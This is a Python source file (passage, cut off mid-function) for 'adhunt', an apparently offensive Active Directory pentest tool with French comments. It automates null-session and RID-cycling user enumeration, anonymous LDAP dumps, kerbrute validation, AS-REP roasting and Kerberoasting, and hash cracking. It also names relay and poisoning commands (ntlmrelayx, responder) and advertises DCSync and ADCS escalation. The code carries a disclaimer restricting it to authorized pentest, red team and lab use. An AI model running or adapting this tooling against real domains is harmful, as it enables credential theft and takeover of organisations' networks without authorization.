#!/usr/bin/env python3
"""
adhunt.py - Enumeration Active Directory (tableau de bord vivant)
=================================================================
L'utilisateur a DEJA fait son nmap et fournit l'IP du DC : adhunt NE SCANNE PAS.
Il ENUMERE et AFFICHE ses trouvailles dans un tableau de bord qui se met a jour
au fur et a mesure (users -> shares -> hashes -> crack -> creds). Le narratif et
les erreurs vont dans loot/<domaine>/debug.log (ecran = infos seulement).

Il pilote les vrais outils (netexec/nxc, impacket, ldap3, kerbrute, certipy,
bloodhound-python, hashcat/john) quand ils sont presents, fallback pur-python.

  RECON      : confirme les services AD (LDAP/SMB/Kerberos/DNS) + rootDSE (PAS de scan)
  ENUM NON-AUTH : password policy, null/RID cycling, kerbrute, AS-REP + Kerberoast guest
  ENUM AUTH  : dump LDAP (kerberoastable/asrep/UAC/deleg/descriptions), Kerberoast,
               GPP cpassword, LAPS, gMSA, BloodHound, FOUILLE des shares
  CRACK      : hashcat/john (auto) -> reinjecte les mots de passe trouves
  ESCALADE   : SEULEMENT avec --exploit (DCSync, ADCS/ESC, RBCD/shadow, DACL, disk hunt)
  RAPPORT    : report.md priorise + report.json + loot/

Usage :
    python adhunt.py 10.10.10.10 -d corp.local                     # enum non-auth
    python adhunt.py 10.10.10.10 -d corp.local -u user -p 'Pass1'  # enum auth complete
    python adhunt.py 10.10.10.10 -d corp.local -u user -H <nt> --exploit --loop

[!] Usage AUTORISE uniquement (pentest/red team/CTF/lab). Rester DANS le scope.
"""

import argparse
import ipaddress
import json
import os
import re
import shutil
import socket
import struct
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# ----------------------------------------------------------------------
class C:
    G = "\033[92m"; Y = "\033[93m"; R = "\033[91m"; B = "\033[94m"
    CY = "\033[96m"; GR = "\033[90m"; BD = "\033[1m"; X = "\033[0m"
if os.name == "nt":
    try:
        import ctypes
        k = ctypes.windll.kernel32
        k.SetConsoleMode(k.GetStdHandle(-11), 7)
    except Exception:
        for a in ("G", "Y", "R", "B", "CY", "GR", "BD", "X"):
            setattr(C, a, "")

VERBOSE = False        # --verbose : reaffiche aussi le bruit (progression/erreurs)
DEBUGF = None          # fichier debug.log (ouvert dans main)
_ANSI = re.compile(r"\033\[[0-9;]*m")
# prefixes de BRUIT (progression, erreurs, warnings) -> caches de l'ecran par defaut
_NOISE = ("[i]", "[-]", "[!]", "[.]", "[~]", "[*]", "[?]")

def _raw(m): print(m)

def log(m):
    """Info ecran. Le BRUIT (progression/erreurs, prefixes [i]/[-]/[!]/...) part
    dans debug.log et n'apparait a l'ecran qu'avec --verbose. Le reste (titres,
    tableaux, findings [+], rapport) s'affiche normalement."""
    plain = _ANSI.sub("", str(m)).lstrip()
    noise = plain.startswith(_NOISE)
    if DEBUGF:
        try:
            DEBUGF.write(_ANSI.sub("", str(m)) + "\n"); DEBUGF.flush()
        except Exception:
            pass
    if noise and not VERBOSE:
        return
    _raw(m)

def dbg(m):
    """Bruit explicite : uniquement dans debug.log (jamais a l'ecran sauf --verbose)."""
    if DEBUGF:
        try:
            DEBUGF.write(_ANSI.sub("", str(m)) + "\n"); DEBUGF.flush()
        except Exception:
            pass
    if VERBOSE:
        _raw(m)

def stage(title):
    dbg(f"\n=== {title} ===")
    if getattr(BOARD, "state", None) is not None:
        BOARD.set_status(title)      # ligne de statut du tableau de bord
    else:
        _raw(f"\n{C.B}{C.BD}  {title}{C.X}")

# ----------------------------------------------------------------------
# TABLEAU DE BORD VIVANT : les findings s'accumulent et le tableau concerne
# se redessine a chaque nouveau "bon truc" trouve (users/shares/creds/hash/crack).
# ----------------------------------------------------------------------
class Board:
    """Rend un tableau de bord depuis `state` : users / shares / hashes / creds.
    Se redessine (efface l'ecran) a chaque appel. Le narratif + les erreurs vont
    dans debug.log (via log()/dbg()), l'ecran ne montre QUE les trouvailles."""
    def __init__(self):
        self.state = None
        self.status = ""
        self.enabled = True

    def bind(self, state):
        self.state = state

    def set_status(self, msg):
        self.status = msg
        dbg(f"[*] {msg}")
        self.redraw()

    def _cred_rows(self):
        rows = []
        for c in (self.state.get("creds") or []):
            u = c.get("user") or "?"
            if c.get("password"):
                secret = c["password"]
            elif c.get("hash"):
                secret = "NT:" + str(c["hash"]).split(":")[-1][:12] + "..."
            else:
                secret = "-"
            rows.append([u, secret, c.get("src") or "-"])
        return rows

    def redraw(self):
        if not (self.enabled and self.state):
            return
        st = self.state
        try:
            tty = sys.stdout.isatty()
        except Exception:
            tty = False
        if tty:
            _raw("\033[2J\033[H")                    # efface l'ecran, curseur en haut
        else:
            _raw("\n" + "=" * 60)                    # sortie redirigee : simple separateur
        dom = st.get("domain") or "?"
        dc = st.get("dc") or "?"
        _raw(f"{C.CY}{C.BD}  adhunt  ::  domaine {dom}  ::  DC {dc}{C.X}")
        if self.status:
            _raw(f"{C.GR}  > {self.status}{C.X}")
        sections = [
            ("[ UTILISATEURS ]", ["samAccountName", "flags", "description"],
             st.get("user_rows") or [], C.X),
            ("[ SHARES / FICHIERS SENSIBLES ]", ["hote", "share", "fichier", "pourquoi"],
             st.get("share_rows") or [], C.CY),
            ("[ HASHES A CRAQUER ]", ["user", "type"], st.get("hash_rows") or [], C.Y),
            ("[ CREDENTIALS  (mdp / hash / crack) ]", ["user", "secret", "source"],
             self._cred_rows(), C.G),
        ]
        for title, headers, rows, col in sections:
            if not rows:
                continue
            _raw(f"\n{C.CY}{C.BD}  {title}  {C.GR}({len(rows)}){C.X}")
            show_table(headers, rows, color=col, cap=40)
        _raw("")

BOARD = Board()

def _dedup_row(state, key, row):
    """Ajoute une ligne unique dans state[key] (listes de findings du Board)."""
    lst = state.setdefault(key, [])
    seen = state.setdefault("_seen_" + key, set())
    sig = "|".join(str(x) for x in row).lower()
    if sig in seen:
        return False
    seen.add(sig)
    lst.append([str(x) if x is not None else "-" for x in row])
    return True

def board_user(state, sam, flags, desc):
    if _dedup_row(state, "user_rows", [sam, flags or "-", (desc or "-")[:60]]):
        BOARD.redraw()

def board_share(state, host, share, fname, why):
    if _dedup_row(state, "share_rows", [host, share, fname, why]):
        BOARD.redraw()

def board_hash(state, user, htype):
    if _dedup_row(state, "hash_rows", [user, htype]):
        BOARD.redraw()

def record_cred(state, user, password=None, nthash=None, src=""):
    """Point unique d'enregistrement d'un cred -> alimente le Board en direct."""
    for c in state.get("creds", []):
        if (c.get("user") or "").lower() == (user or "").lower() and \
           c.get("password") == password and c.get("hash") == nthash:
            return c
    cred = {"user": user, "password": password, "hash": nthash, "src": src}
    state.setdefault("creds", []).append(cred)
    BOARD.redraw()
    return cred

def table_lines(headers, rows):
    """Rend une table ASCII alignee (liste de lignes texte)."""
    cols = len(headers)
    w = [len(str(headers[i])) for i in range(cols)]
    for r in rows:
        for i in range(cols):
            w[i] = max(w[i], len(str(r[i])))
    fmt = lambda row: " | ".join(str(row[i]).ljust(w[i]) for i in range(cols))
    sep = "-+-".join("-" * w[i] for i in range(cols))
    return [fmt(headers), sep] + [fmt(r) for r in rows]

def show_table(headers, rows, color=None, cap=60):
    """Affiche une table dans le terminal (tronque a `cap` lignes)."""
    if not rows:
        return
    shown = rows[:cap]
    lines = table_lines(headers, shown)
    log(f"  {C.BD}{lines[0]}{C.X}")
    log(f"  {C.GR}{lines[1]}{C.X}")
    for l in lines[2:]:
        log(f"  {(color or C.G)}{l}{C.X}")
    if len(rows) > cap:
        log(f"  {C.GR}... (+{len(rows)-cap}, tout dans le fichier){C.X}")

def save_table(args, name, headers, rows):
    """Ecrit une table lisible dans loot/<name>."""
    with open(os.path.join(args.loot, name), "w", encoding="utf-8") as f:
        f.write("\n".join(table_lines(headers, rows)) + "\n")

AUDIT = None  # fichier d'audit ouvert dans main()
def audit(line):
    if AUDIT:
        AUDIT.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')}  {line}\n")
        AUDIT.flush()

def have(tool):
    """Vrai outil externe present dans le PATH ?"""
    return shutil.which(tool) is not None

def have_lib(name):
    try:
        __import__(name)
        return True
    except Exception:
        return False

# ----------------------------------------------------------------------
# Ports AD d'interet
# ----------------------------------------------------------------------
AD_PORTS = {
    53:   "DNS",
    88:   "Kerberos",
    135:  "RPC/EPM",
    139:  "NetBIOS",
    389:  "LDAP",
    445:  "SMB",
    464:  "kpasswd",
    636:  "LDAPS",
    3268: "GC/LDAP",
    3269: "GC/LDAPS",
    5985: "WinRM",
    5986: "WinRM-S",
    3389: "RDP",
    1433: "MSSQL",
    9389: "ADWS",
}
# signaux forts de Domain Controller (Kerberos + LDAP + SMB, souvent GC)
DC_SIGNAL = {88, 389, 445}

# services courants NON-AD (souvent le foothold : web, ftp, rpc-http...) -> scannes par defaut
COMMON_PORTS = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 80: "http", 110: "pop3",
    111: "rpcbind", 143: "imap", 443: "https", 465: "smtps", 587: "smtp",
    593: "rpc-http", 873: "rsync", 993: "imaps", 995: "pop3s", 2049: "nfs",
    3306: "mysql", 5357: "wsdapi", 5432: "postgres", 6379: "redis",
    8000: "http-alt", 8008: "http-alt", 8080: "http-alt", 8443: "https-alt",
    8888: "http-alt", 9090: "http-alt", 10000: "webmin",
}
PORT_NAMES = {**COMMON_PORTS, **AD_PORTS}   # AD prioritaire pour le nom

# ----------------------------------------------------------------------
# Confirmation de service (pur python, threade) - PAS un scan nmap :
# on teste juste les ports AD connus sur la cible que l'utilisateur fournit.
# ----------------------------------------------------------------------
def scan_host(ip, ports, timeout=1.2):
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            if s.connect_ex((ip, port)) == 0:
                open_ports.append(port)
            s.close()
        except Exception:
            pass
    return ip, open_ports

def scan_network(hosts, ports, threads=100, timeout=1.2):
    results = {}
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(scan_host, h, ports, timeout): h for h in hosts}
        done = 0
        for fu in as_completed(futs):
            done += 1
            if done % 32 == 0:
                sys.stdout.write(f"\r{C.GR}    scan {done}/{len(hosts)}{C.X}")
                sys.stdout.flush()
            ip, op = fu.result()
            if op:
                results[ip] = op
    sys.stdout.write("\r" + " " * 40 + "\r")
    return results

# ----------------------------------------------------------------------
# Sonde SMB2 brute (pur python) : signing requis ? + clock skew + dialecte
# On envoie un SMB2 NEGOTIATE minimal et on lit la reponse.
# ----------------------------------------------------------------------
SMB2_DIALECTS = [0x0202, 0x0210, 0x0300, 0x0302]

def _smb2_negotiate_packet():
    # En-tete SMB2 (64 octets)
    hdr = b"\xfeSMB"                 # ProtocolId
    hdr += struct.pack("<H", 64)     # StructureSize
    hdr += struct.pack("<H", 0)      # CreditCharge
    hdr += struct.pack("<I", 0)      # Status
    hdr += struct.pack("<H", 0)      # Command = NEGOTIATE
    hdr += struct.pack("<H", 0)      # Credits
    hdr += struct.pack("<I", 0)      # Flags
    hdr += struct.pack("<I", 0)      # NextCommand
    hdr += struct.pack("<Q", 0)      # MessageId
    hdr += struct.pack("<I", 0)      # Reserved
    hdr += struct.pack("<I", 0)      # TreeId
    hdr += struct.pack("<Q", 0)      # SessionId
    hdr += b"\x00" * 16              # Signature
    # Corps NEGOTIATE
    body = struct.pack("<H", 36)                     # StructureSize
    body += struct.pack("<H", len(SMB2_DIALECTS))    # DialectCount
    body += struct.pack("<H", 1)                     # SecurityMode = signing enabled
    body += struct.pack("<H", 0)                     # Reserved
    body += struct.pack("<I", 0)                     # Capabilities
    body += b"\x00" * 16                             # ClientGuid
    body += struct.pack("<Q", 0)                     # ClientStartTime
    for d in SMB2_DIALECTS:
        body += struct.pack("<H", d)
    smb = hdr + body
    # Transport Direct TCP : 1 octet zero + 3 octets longueur
    return struct.pack(">I", len(smb)) + smb

def smb2_probe(ip, timeout=3):
    """Renvoie {signing_required, system_time (epoch), dialect} ou None."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, 445))
        s.sendall(_smb2_negotiate_packet())
        # lit la longueur (4 octets transport) puis le corps
        hdr = b""
        while len(hdr) < 4:
            chunk = s.recv(4 - len(hdr))
            if not chunk:
                return None
            hdr += chunk
        total = struct.unpack(">I", hdr)[0]
        data = b""
        while len(data) < total:
            chunk = s.recv(total - len(data))
            if not chunk:
                break
            data += chunk
        s.close()
        if len(data) < 64 + 64 or data[:4] != b"\xfeSMB":
            return None
        body = data[64:]  # apres l'en-tete SMB2
        sec_mode = struct.unpack("<H", body[2:4])[0]
        dialect = struct.unpack("<H", body[4:6])[0]
        # Corps NEGOTIATE response : StructSize(2) SecMode(2) Dialect(2) CtxCount(2)
        # ServerGuid(16) Capabilities(4) MaxTrans(4) MaxRead(4) MaxWrite(4)
        # SystemTime(8)@40 ServerStartTime(8)@48
        filetime = struct.unpack("<Q", body[40:48])[0]
        epoch = filetime / 1e7 - 11644473600 if filetime else 0
        return {"signing_required": bool(sec_mode & 0x2),
                "system_time": epoch, "dialect": dialect}
    except Exception:
        return None

DIALECT_NAME = {0x0202: "SMB 2.0.2", 0x0210: "SMB 2.1", 0x0300: "SMB 3.0",
                0x0302: "SMB 3.0.2", 0x0311: "SMB 3.1.1"}

# ----------------------------------------------------------------------
# LDAP rootDSE anonyme (via ldap3 si dispo)
# ----------------------------------------------------------------------
def ldap_rootdse(ip, timeout=5):
    if not have_lib("ldap3"):
        return None
    try:
        from ldap3 import Server, Connection, ALL, BASE
        srv = Server(ip, get_info=ALL, connect_timeout=timeout)
        conn = Connection(srv, auto_bind=True, receive_timeout=timeout)
        conn.search("", "(objectClass=*)", search_scope=BASE,
                    attributes=["defaultNamingContext", "rootDomainNamingContext",
                                "dnsHostName", "ldapServiceName", "serverName",
                                "domainFunctionality", "forestFunctionality",
                                "supportedSASLMechanisms"])
        info = {}
        if conn.entries:
            e = conn.entries[0]
            for a in ("defaultNamingContext", "rootDomainNamingContext",
                      "dnsHostName", "ldapServiceName", "serverName",
                      "domainFunctionality", "forestFunctionality"):
                v = getattr(e, a, None)
                if v and str(v):
                    info[a] = str(v)
        conn.unbind()
        return info or None
    except Exception:
        return None

def dn_to_domain(dn):
    """DC=corp,DC=local -> corp.local"""
    if not dn:
        return None
    parts = re.findall(r"DC=([^,]+)", dn, re.I)
    return ".".join(parts) if parts else None

# ----------------------------------------------------------------------
# Enum SMB null (via impacket si dispo) : OS, domaine, hostname
# ----------------------------------------------------------------------
def smb_null_info(ip, timeout=5):
    if not have_lib("impacket"):
        return None
    try:
        from impacket.smbconnection import SMBConnection
        conn = SMBConnection(ip, ip, timeout=timeout)
        try:
            conn.login("", "")  # session null
        except Exception:
            pass
        info = {"os": conn.getServerOS(), "hostname": conn.getServerName(),
                "domain": conn.getServerDomain() or conn.getServerDNSDomainName(),
                "dns_hostname": None}
        try:
            info["dns_hostname"] = conn.getServerDNSHostName()
        except Exception:
            pass
        try:
            conn.logoff()
        except Exception:
            pass
        return {k: v for k, v in info.items() if v}
    except Exception:
        return None

# ----------------------------------------------------------------------
# RECON : confirmation des services AD (PAS de scan nmap - l'utilisateur a
# deja scanne et fournit l'IP du/des DC). On confirme juste LDAP/SMB/Kerberos/DNS
# repondent, on lit le rootDSE (domaine/foret) et on fingerprinte SMB.
# ----------------------------------------------------------------------
def confirm_services(targets, args, state):
    stage("RECON - SERVICES AD (pas de scan : cible fournie)")
    audit(f"RECON confirm {len(targets)} hosts")
    BOARD.set_status("recon : confirmation des services AD...")
    # sonde LEGERE des seuls ports AD connus (confirmation, pas un scan de ports)
    ad_ports = sorted(AD_PORTS)
    found = scan_network(targets, ad_ports, threads=args.threads, timeout=args.timeout)
    if not found:
        log(f"{C.R}[!] Aucun service AD ne repond sur la/les cible(s). "
            f"Verifie l'IP du DC (celle que TON nmap a trouvee) et le reseau.{C.X}")
        return {}

    hosts = {}
    dcs = []
    for ip in sorted(found, key=lambda x: tuple(int(o) for o in x.split("."))
                     if re.match(r"^\d+\.\d+\.\d+\.\d+$", x) else (0,)):
        op = found[ip]
        is_dc = DC_SIGNAL.issubset(set(op)) or 3268 in op or 464 in op
        rec = {"ip": ip, "ports": op, "is_dc": is_dc,
               "services": {p: PORT_NAMES.get(p, "?") for p in op}}
        # enrichissement sur SMB
        if 445 in op:
            smb = smb2_probe(ip)
            if smb:
                rec["smb_signing_required"] = smb["signing_required"]
                rec["smb_dialect"] = DIALECT_NAME.get(smb["dialect"], hex(smb["dialect"]))
                rec["server_time"] = smb["system_time"]
                if smb["system_time"]:
                    skew = smb["system_time"] - time.time()
                    rec["clock_skew_sec"] = round(skew)
            nfo = smb_null_info(ip)
            if nfo:
                rec.update({f"smb_{k}": v for k, v in nfo.items()})
        # enrichissement LDAP (surtout DC)
        if is_dc or 389 in op:
            rd = ldap_rootdse(ip)
            if rd:
                rec["ldap"] = rd
                dom = dn_to_domain(rd.get("defaultNamingContext"))
                forest = dn_to_domain(rd.get("rootDomainNamingContext"))
                if dom: rec["domain"] = dom
                if forest: rec["forest"] = forest
                if rd.get("dnsHostName"): rec["dns_hostname"] = rd["dnsHostName"]
        hosts[ip] = rec
        if is_dc:
            dcs.append(ip)

    # affichage
    for ip, rec in hosts.items():
        tag = f"{C.R}{C.BD}[DC]{C.X} " if rec["is_dc"] else ""
        svc = " ".join(f"{p}/{PORT_NAMES.get(p,'?')}" for p in rec["ports"])
        log(f"\n  {tag}{C.G}{C.BD}{ip}{C.X}  {C.GR}{svc}{C.X}")
        name = rec.get("dns_hostname") or rec.get("smb_hostname")
        if name:
            log(f"      hote     : {C.CY}{name}{C.X}")
        if rec.get("domain"):
            log(f"      domaine  : {C.CY}{rec['domain']}{C.X}"
                + (f"   foret: {rec['forest']}" if rec.get("forest") else ""))
        if rec.get("smb_os"):
            log(f"      OS       : {rec['smb_os']}")
        if "smb_signing_required" in rec:
            sr = rec["smb_signing_required"]
            col = C.G if sr else C.R
            extra = "" if sr else f"  {C.R}{C.BD}<- RELAIS NTLM POSSIBLE{C.X}"
            log(f"      SMB      : {rec.get('smb_dialect','?')}  | signing requis: "
                f"{col}{sr}{C.X}{extra}")
        if "clock_skew_sec" in rec:
            sk = rec["clock_skew_sec"]
            col = C.G if abs(sk) < 120 else C.R
            warn = "" if abs(sk) < 300 else f"  {C.R}<- Kerberos KO (>5min), sync l'horloge{C.X}"
            log(f"      horloge  : ecart {col}{sk:+d}s{C.X}{warn}")
        # table services (pas de version : on ne relance pas de scan nmap)
        prows = [[p, "tcp", PORT_NAMES.get(p, "?")] for p in rec["ports"]]
        save_table(args, f"services_{ip}.txt", ["PORT", "PROTO", "SERVICE"], prows)

    # synthese
    log(f"\n{C.CY}{C.BD}[=] {len(hosts)} hote(s) AD, dont {len(dcs)} DC : "
        f"{', '.join(dcs) if dcs else 'aucun identifie'}{C.X}")
    relayable = [ip for ip, r in hosts.items() if r.get("smb_signing_required") is False]
    if relayable:
        log(f"{C.R}{C.BD}[!] Signing SMB non requis sur {len(relayable)} hote(s) "
            f"-> surface de relais NTLM (ntlmrelayx).{C.X}")
    # auto-detection du domaine si non fourni
    if not args.domain:
        for r in hosts.values():
            if r.get("domain"):
                args.domain = r["domain"]
                log(f"{C.GR}[i] Domaine auto-detecte : {args.domain}{C.X}")
                break
    # renseigne le tableau de bord (entete domaine/DC)
    state["domain"] = args.domain
    state["dc"] = dcs[0] if dcs else (list(hosts)[0] if hosts else None)
    BOARD.redraw()
    return hosts

# ======================================================================
# HELPERS communs aux phases actives
# ======================================================================
import subprocess

def run_cmd(cmd, timeout=300, feed=None):
    """Lance une commande externe, renvoie (rc, stdout, stderr).
    IMPORTANT : stdin fourni (jamais None) + NOUVELLE SESSION sans terminal
    (start_new_session) -> getpass ne peut plus ouvrir /dev/tty -> AUCUN prompt
    'Password:' ne peut bloquer l'outil (ex: GetUserSPNs/secretsdump/certipy)."""
    audit("CMD " + " ".join(str(c) for c in cmd))
    try:
        pr = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout,
                            input=(feed if feed is not None else ""), errors="ignore",
                            start_new_session=True)
        return pr.returncode, pr.stdout or "", pr.stderr or ""
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"
    except Exception as e:
        return -1, "", str(e)

def nxc_bin():
    for b in ("nxc", "netexec", "crackmapexec"):
        if have(b):
            return b
    return None

def nxc_version():
    b = nxc_bin()
    if not b:
        return None
    rc, out, err = run_cmd([b, "--version"], 15)
    return (out or err).strip().splitlines()[0] if (out or err).strip() else "?"

def nxc_auth(args, null=False):
    """Arguments d'authentification pour nxc."""
    if null:
        return ["-u", "", "-p", ""]
    a = []
    if args.user:
        a += ["-u", args.user]
    if args.nthash:
        a += ["-H", args.nthash]
    elif args.password is not None:
        a += ["-p", args.password]
    if args.kerberos:
        a += ["-k"]
    return a

def nt_full(h):
    """Normalise un hash NTLM en LM:NT pour impacket/ldap3."""
    return h if ":" in h else "aad3b435b51404eeaad3b435b51404ee:" + h

def impacket_creds(args):
    """(target_prefix, extra_args) pour les scripts impacket."""
    dom = args.domain or ""
    if args.nthash:
        return f"{dom}/{args.user}", ["-hashes", nt_full(args.nthash)]
    return f"{dom}/{args.user}:{args.password or ''}", []

def first_dc(hosts):
    for ip, r in hosts.items():
        if r.get("is_dc"):
            return ip
    return next(iter(hosts), None)

def effective_creds(args, state):
    """Creds a utiliser pour les phases auth : args en priorite, sinon celles trouvees."""
    if args.user and (args.password or args.nthash or args.kerberos):
        return True
    for c in state.get("creds", []):
        args.user = c.get("user"); args.password = c.get("password")
        args.nthash = c.get("hash")
        log(f"{C.GR}[i] Utilisation des creds trouvees : {args.user}{C.X}")
        return True
    return False

def add_finding(state, sev, title, detail="", host=""):
    # dedup : evite les doublons (surtout quand --loop re-scanne)
    key = (sev, title, host)
    if any((f["sev"], f["title"], f["host"]) == key for f in state.get("findings", [])):
        return
    state.setdefault("findings", []).append(
        {"sev": sev, "title": title, "detail": detail, "host": host})
    col = {"CRIT": C.R, "HIGH": C.R, "MED": C.Y, "INFO": C.GR}.get(sev, C.GR)
    log(f"    {col}{C.BD}[{sev}]{C.X} {title}" + (f" {C.GR}({host}){C.X}" if host else ""))

def _once(state, key):
    """Vrai la 1re fois seulement : evite de refaire le travail lourd en boucle."""
    s = state.setdefault("_done", set())
    if key in s:
        return False
    s.add(key)
    return True

def save_loot(args, name, content):
    path = os.path.join(args.loot, name)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    return path

def ldap_bind(args, dc_ip, timeout=6):
    """Bind LDAP authentifie (ldap3, NTLM ou pass-the-hash)."""
    if not have_lib("ldap3"):
        return None
    if not args.user or (args.password is None and not args.nthash):
        log(f"{C.Y}[i] Bind LDAP saute : creds incompletes (-u + -p/-H requis).{C.X}")
        return None
    try:
        from ldap3 import Server, Connection, ALL, NTLM
        srv = Server(dc_ip, get_info=ALL, connect_timeout=timeout)
        user = f"{args.domain}\\{args.user}"
        pw = nt_full(args.nthash) if args.nthash else args.password
        conn = Connection(srv, user=user, password=pw, authentication=NTLM,
                          auto_bind=True, receive_timeout=timeout)
        return conn
    except Exception as e:
        log(f"{C.GR}    (bind LDAP echoue : {e}){C.X}")
        return None

def ldap_search_all(conn, base, filt, attrs, controls=None, page=500):
    """Recherche LDAP AVEC pagination complete (cookie) : ne tronque plus a 500/1000.
    Renvoie la liste de toutes les entrees."""
    from ldap3 import SUBTREE
    out, cookie = [], None
    while True:
        conn.search(base, filt, search_scope=SUBTREE, attributes=attrs,
                    paged_size=page, paged_cookie=cookie, controls=controls)
        out.extend(conn.entries)
        try:
            cookie = conn.result["controls"]["1.2.840.113556.1.4.319"]["value"]["cookie"]
        except Exception:
            cookie = None
        if not cookie:
            break
    return out

UAC = {0x0002: "DISABLED", 0x0010: "LOCKOUT", 0x0020: "PWD_NOTREQD",
       0x10000: "PWD_NEVER_EXPIRES", 0x80000: "TRUSTED_FOR_DELEGATION",
       0x100000: "NOT_DELEGATED", 0x400000: "DONT_REQ_PREAUTH",
       0x1000000: "TRUSTED_TO_AUTH_FOR_DELEGATION"}
def uac_flags(v):
    try:
        v = int(v)
    except Exception:
        return []
    return [name for bit, name in UAC.items() if v & bit]

# ======================================================================
# PHASE 1 : ENUM NON-AUTHENTIFIEE
# ======================================================================
def phase1_unauth(hosts, args, state):
    stage("PHASE 1 - ENUM NON-AUTHENTIFIEE")
    dc = first_dc(hosts)
    if not dc:
        log(f"{C.R}[!] Pas de DC identifie -> phase 1 limitee.{C.X}")
        return
    nxc = nxc_bin()
    confirmed = set()   # vrais comptes enumeres (LDAP/RID/nxc/kerbrute-valide)
    seed = set()        # userlist fournie (validation kerbrute / roast en aveugle)

    # userlist fournie -> seed (PAS traitee comme des comptes confirmes)
    if getattr(args, "userlist", None) and os.path.isfile(args.userlist):
        with open(args.userlist, encoding="utf-8", errors="ignore") as f:
            for line in f:
                u = line.strip()
                if u and not u.startswith("#"):
                    seed.add(u.split("@")[0].split("\\")[-1])
        log(f"{C.GR}[i] Userlist chargee : {len(seed)} utilisateur(s) (seed).{C.X}")

    # surface de relais/coercion + poisoning (findings)
    for ip, r in hosts.items():
        if r.get("smb_signing_required") is False:
            add_finding(state, "HIGH", "SMB signing non requis (relais NTLM)",
                        "ntlmrelayx.py -tf targets -smb2support", ip)
    add_finding(state, "INFO", "LLMNR/NBT-NS/mDNS poisoning (position reseau)",
                "responder -I <iface> -wv -> capture NetNTLMv2 -> hashcat -m 5600 / relais")

    # 1) password policy + null session + RID cycling -> confirmed
    if nxc:
        log(f"{C.GR}[i] {nxc} : password policy + null session sur {dc}...{C.X}")
        rc, out, _ = run_cmd([nxc, "smb", dc] + nxc_auth(args, null=True) + ["--pass-pol"], 120)
        m = re.search(r"Lockout Threshold\s*:?\s*(\d+|None)", out, re.I)
        if m:
            thr = m.group(1)
            state["lockout_threshold"] = None if thr.lower() == "none" else int(thr)
            log(f"    {C.CY}Lockout threshold : {thr}{C.X}")
        for flag in ("--shares", "--users", "--groups"):
            rc, out, _ = run_cmd([nxc, "smb", dc] + nxc_auth(args, null=True) + [flag], 120)
            if flag == "--users":
                for mu in re.finditer(r"\\([A-Za-z0-9._$-]+)\s", out):
                    confirmed.add(mu.group(1))
            if flag == "--shares" and out.strip() and ("READ" in out or "SHARE" in out):
                add_finding(state, "MED", "Null session SMB autorisee (shares listables)",
                            "nxc smb <dc> -u '' -p '' --shares", dc)
        log(f"{C.GR}[i] {nxc} : RID cycling (--rid-brute)...{C.X}")
        rc, out, _ = run_cmd([nxc, "smb", dc] + nxc_auth(args, null=True) + ["--rid-brute"], 180)
        for mu in re.finditer(r":\s*[A-Za-z0-9.-]+\\([A-Za-z0-9._$-]+)\s*\(SidTypeUser\)", out):
            confirmed.add(mu.group(1))
    elif have("enum4linux-ng"):
        log(f"{C.GR}[i] enum4linux-ng sur {dc}...{C.X}")
        rc, out, _ = run_cmd(["enum4linux-ng", "-A", dc], 300)
        for mu in re.finditer(r"username:\s*([A-Za-z0-9._$-]+)", out):
            confirmed.add(mu.group(1))
    elif have("rpcclient"):
        log(f"{C.GR}[i] rpcclient (null session) sur {dc}...{C.X}")
        rc, out, _ = run_cmd(["rpcclient", "-U", "", "-N", dc, "-c", "enumdomusers"], 120)
        for mu in re.finditer(r"user:\[([^\]]+)\]", out):
            confirmed.add(mu.group(1))
    else:
        log(f"{C.Y}[i] nxc/netexec absent -> null/RID limites (pip/apt: netexec).{C.X}")

    # LDAP anonyme -> confirmed
    if have_lib("ldap3"):
        rd = ldap_rootdse(dc)
        if rd and rd.get("defaultNamingContext"):
            try:
                from ldap3 import Server, Connection, SUBTREE
                conn = Connection(Server(dc), auto_bind=True, receive_timeout=6)
                if conn.search(rd["defaultNamingContext"], "(objectClass=user)",
                               search_scope=SUBTREE, attributes=["sAMAccountName"]) and conn.entries:
                    for e in conn.entries:
                        s = str(getattr(e, "sAMAccountName", "") or "")
                        if s:
                            confirmed.add(s)
                    add_finding(state, "MED", "LDAP anonymous bind autorise (dump users)",
                                f"{len(conn.entries)} objets user lus en anonyme", dc)
                conn.unbind()
            except Exception:
                pass

    confirmed = {u for u in confirmed if u and not u.endswith("$")}

    # kerbrute : valide le seed (ou les confirmes) -> ajoute les valides aux confirmes
    if have("kerbrute") and args.domain and (seed or confirmed):
        src = sorted(seed or confirmed)
        kf = save_loot(args, "kerbrute_in.txt", "\n".join(src) + "\n")
        log(f"{C.GR}[i] kerbrute userenum ({len(src)} candidats, sans lockout)...{C.X}")
        rc, out, _ = run_cmd(["kerbrute", "userenum", "-d", args.domain, "--dc", dc, kf], 300)
        valid = re.findall(r"VALID USERNAME:\s+([A-Za-z0-9._-]+)@", out)
        confirmed |= {v for v in valid if not v.endswith("$")}
        if valid:
            log(f"    {C.G}{len(set(valid))} username(s) valide(s) confirme(s){C.X}")

    # liste a roaster : les confirmes si on en a, sinon le seed brut (roast en aveugle)
    roast_users = sorted(confirmed) if confirmed else sorted(seed)
    if roast_users:
        save_loot(args, "users.txt", "\n".join(roast_users) + "\n")   # input GetNPUsers
    confirmed = sorted(confirmed)
    state["users"] = confirmed or roast_users

    # TABLE des utilisateurs confirmes (affichage + sauvegarde)
    if confirmed:
        save_loot(args, "confirmed_users.txt", "\n".join(confirmed) + "\n")
        urows = [[i + 1, u] for i, u in enumerate(confirmed)]
        save_table(args, "users_table.txt", ["#", "UTILISATEUR"], urows)
        for u in confirmed:
            board_user(state, u, "-", "")
    elif roast_users:
        log(f"{C.GR}[i] {len(roast_users)} candidats (seed, non valides) -> AS-REP en aveugle.{C.X}")

    # AS-REP roasting + Kerberoast via Guest (foothold sans creds valides)
    phase_asrep(dc, args, state, label="non-auth")
    kerberoast_guest(args, state, dc)
    # gains SANS creds -> on crack tout de suite (nourrit la suite)
    if state.get("hashes"):
        crack_hashes(args, state)

def kerberoast_guest(args, state, dc):
